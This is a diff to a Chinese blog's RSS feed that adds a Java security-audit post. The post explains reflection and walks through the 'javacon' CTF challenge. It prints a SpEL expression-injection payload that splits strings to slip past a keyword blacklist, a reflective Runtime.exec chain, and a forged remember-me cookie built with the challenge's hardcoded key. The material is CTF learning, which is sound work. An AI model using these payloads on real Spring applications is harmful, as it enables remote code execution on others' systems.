@@ -1,5 +1,108 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>prontosil.blog</title><link>/Blog-With-GitHub-Boilerplate/</link><description>只坚持一种正义。我的正义。</description><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>${static_prefix}logo.png</url><title>prontosil.blog</title><link>/Blog-With-GitHub-Boilerplate/</link></image><language>zh-CN</language><lastBuildDate>Tue, 31 Dec 2019 08:34:22 +0806</lastBuildDate><pubDate>Tue, 31 Dec 2019 08:34:22 +0806</pubDate><item><title>我的第一篇文章</title><link>/Blog-With-GitHub-Boilerplate/archives/my-first-awesome-post/</link><description>&lt;p&gt;这是我的第一篇文章。文章使用 GitHub 管理，并通过 GitHub Actions 自动构建与发布！&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>prontosil.blog</title><link>/Blog-With-GitHub-Boilerplate/</link><description>只坚持一种正义。我的正义。</description><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>${static_prefix}logo.png</url><title>prontosil.blog</title><link>/Blog-With-GitHub-Boilerplate/</link></image><language>zh-CN</language><lastBuildDate>Tue, 31 Dec 2019 08:41:20 +0806</lastBuildDate><pubDate>Tue, 31 Dec 2019 08:41:20 +0806</pubDate><item><title>java审计入门</title><link>/Blog-With-GitHub-Boilerplate/archives/typography/</link><description>&lt;h2&gt;反射相关概念&lt;/h2&gt;
+&lt;p&gt;引用p牛的一句话&lt;/p&gt;
+&lt;blockquote&gt;&lt;p&gt;一段代码，改变其中的变量，将会导致这段代码产⽣生功能性的变化，我称之为动态特性&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;PHP本身有很多的动态特性，java虽然没有那么灵活，但是java的反射赋予了Java一些动态地特性&lt;/p&gt;
+&lt;p&gt;我在学习java的时候，一直不太清楚java是如何获取变量的类型的，python和JavaScript都可以用&lt;code&gt;type&lt;/code&gt;来分清楚这个变量的类型&lt;/p&gt;
+&lt;p&gt;后来才知道&lt;code&gt;getClass&lt;/code&gt;这个方法，可以返回变量的类型&lt;/p&gt;
+&lt;p&gt;比如&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;System.out.println("a".getClass());
+
+输出class java.lang.String
+
+System.out.println(new Integer(1).getClass());
+
+输出class java.lang.Integer
+
+System.out.println(Runtime.getRuntime().getClass());
+输出 class java.lang.Runtime&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样就知道了这个对象属于哪个类&lt;/p&gt;
+&lt;p&gt;其实我们不止可以获得对象属于哪个类，我们还可以调用这个对象所属的类的方法&lt;/p&gt;
+&lt;p&gt;来看一个最常用的payload&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.lang.Runtime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;calc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;ol&gt;
+&lt;li&gt;首先获取&lt;code&gt;java.lang.Runtime&lt;/code&gt;的类型&lt;code&gt;类&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;然后获取&lt;code&gt;java.lang.Runtime&lt;/code&gt;的方法&lt;code&gt;exec&lt;/code&gt;，由于&lt;code&gt;exec&lt;/code&gt;方法有重载，所以要指明参数类型&lt;code&gt;String.class&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;之后通过&lt;code&gt;invoke&lt;/code&gt;调用，第一个参数是&lt;code&gt;Runtime&lt;/code&gt;的对象，第二个参数是&lt;code&gt;calc&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;invoke调用时候的规定如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;如果是一个普通方法，第一个参数是类对象&lt;/li&gt;
+&lt;li&gt;如果是一个静态方法，第一个参数是类&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;java.lang.Runtime&lt;/code&gt;的构造函数是私有的，也就是说不能通过实例化来产生其对象，必须通过调用&lt;code&gt;java.lang.Runtime.getRuntime&lt;/code&gt;方法来得到一个对象&lt;/p&gt;
+&lt;p&gt;同时&lt;code&gt;getRuntime&lt;/code&gt;方法是静态方法，所以&lt;code&gt;invoke&lt;/code&gt;的第一个参数是类对象，没有其他的参数了&lt;/p&gt;
+&lt;p&gt;单例模式是因为有些操作只需要做一次就够了，比如建立数据库连接之类的&lt;/p&gt;
+&lt;p&gt;故其实中还有一次反射调用&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;获取&lt;code&gt;java.lang.Runtime&lt;/code&gt;的方法&lt;code&gt;getRuntime&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;通过invoke调用，产生一个&lt;code&gt;Runtime&lt;/code&gt;的实例对象&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;反序列化&lt;/h2&gt;
+&lt;p&gt;java的反序列化是通过&lt;code&gt;ObjectOutputStream&lt;/code&gt;和&lt;code&gt;ObjectInputStream&lt;/code&gt;两个类来实现的，同时要序列化的类必须实现&lt;code&gt;Serializable&lt;/code&gt;接口&lt;/p&gt;
+&lt;p&gt;与PHP类似，Java在序列化一个对象的时候会调用&lt;code&gt;writeObject&lt;/code&gt;方法，在反序列化一个对象的时候会调用&lt;code&gt;readObject&lt;/code&gt;方法&lt;/p&gt;
+&lt;h2&gt;code-breaking——javacon&lt;/h2&gt;
+&lt;p&gt;一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;application.yml&lt;/code&gt;中有一些相关的设置&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;keywords:
+  blacklist:
+    - java.+lang
+    - Runtime
+    - exec.*\(
+user:
+  username: admin
+  password: admin
+  rememberMeKey: c0dehack1nghere1&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;keywords&lt;/code&gt;是我们之后要绕过的&lt;/p&gt;
+&lt;p&gt;仔细分析代码，其中有存在一处类似模板渲染的语句&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ParserContext&lt;/span&gt; &lt;span class="n"&gt;parserContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;TemplateParserContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="n"&gt;Expression&lt;/span&gt; &lt;span class="n"&gt;exp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;parseExpression&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;parserContext&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="n"&gt;SmallEvaluationContext&lt;/span&gt; &lt;span class="n"&gt;evaluationContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;SmallEvaluationContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;exp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;evaluationContext&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;其实就是与其跟黑名单做正则匹配，如果匹配成功则抛出&lt;code&gt;HttpStatus.FORBIDDEN&lt;/code&gt;，如果没有匹配到则进行正常流程，在&lt;code&gt;SmallEvaluationContext&lt;/code&gt;进行SpEL表达式解析。注意，这里就存在El表达式注入的问题了。&lt;/p&gt;
+&lt;p&gt;这一处位于&lt;code&gt;getAdvanceValue&lt;/code&gt;函数中，调用它的是这里：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@GetMapping&lt;/span&gt;
+    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;admin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nd"&gt;@CookieValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;remember-me&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;required&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;rememberMeValue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                        &lt;span class="n"&gt;HttpSession&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+                        &lt;span class="n"&gt;Model&lt;/span&gt; &lt;span class="n"&gt;model&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rememberMeValue&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;rememberMeValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;userConfig&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;decryptRememberMe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rememberMeValue&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+
+        &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;redirect:/login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+
+        &lt;span class="n"&gt;model&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;addAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getAdvanceValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;()));&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;这里相当于是admin的管理界面，首先会检查&lt;code&gt;rememberMeValue&lt;/code&gt;的值，并且尝试去解密其中的用户名，同时加入到&lt;code&gt;session&lt;/code&gt;中，之后执行&lt;code&gt;model.addAttribute("name", getAdvanceValue(username.toString()));&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;那么这里的关键就是&lt;code&gt;cookie&lt;/code&gt;中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造&lt;code&gt;rememberMeValue&lt;/code&gt;来达到rce&lt;/p&gt;
+&lt;p&gt;首先需要一条java的反射链，因为要绕过一些关键字：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.l&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ang.Ru&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ntime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;getMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ex&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ec&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.l&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ang.Ru&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ntime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;getMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;getRu&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ntime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.l&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ang.Ru&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ntime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;calc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;之后要将其构造成Spel表达式，就是增加一个&lt;code&gt;T()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先本地测试弹一个计算器&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;System.out.println(Encryptor.encrypt("c0dehack1nghere1", "0123456789abcdef", "#{T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"calc\"})}"));&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;生成的payload&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之后登陆再替换掉cookie&lt;/p&gt;
+&lt;p&gt;&lt;figure class="pswp-item" style="flex: 75.06127450980392" data-width="1225" data-height="816"&gt;&lt;img src="/Blog-With-GitHub-Boilerplate/archives/assets/b3e86c22de52ed11a49a915c605c349f.png" alt="1573973547431" /&gt;&lt;figcaption&gt;1573973547431&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;当然后续还有其他的利用过程去读flag,就不一一细说了&lt;/p&gt;
+</description><author>xinyongp@gmail.com (AlanDecode)</author><guid isPermaLink="true">/Blog-With-GitHub-Boilerplate/archives/typography/</guid><pubDate>Sun, 17 Nov 2019 13:53:36 +0806</pubDate></item><item><title>我的第一篇文章</title><link>/Blog-With-GitHub-Boilerplate/archives/my-first-awesome-post/</link><description>&lt;p&gt;这是我的第一篇文章。文章使用 GitHub 管理，并通过 GitHub Actions 自动构建与发布！&lt;/p&gt;
 </description><author>xinyongp@gmail.com (&lt;填写你的名字&gt;)</author><guid isPermaLink="true">/Blog-With-GitHub-Boilerplate/archives/my-first-awesome-post/</guid><pubDate>Tue, 17 Dec 2019 20:34:00 +0806</pubDate></item><item><title>Hello World!</title><link>/Blog-With-GitHub-Boilerplate/archives/typography/</link><description>&lt;div class="notice"&gt;这是一篇示例文章，在这里你可以看到常用页面元素的显示效果，同时也是 Markdown 语法的参考文章。保留或者删除本文，开始自己的创作吧！&lt;/div&gt;&lt;h2&gt;L2 Heading&lt;/h2&gt;
 &lt;h3&gt;L3 Heading&lt;/h3&gt;
 &lt;h4&gt;L4 Heading&lt;/h4&gt;
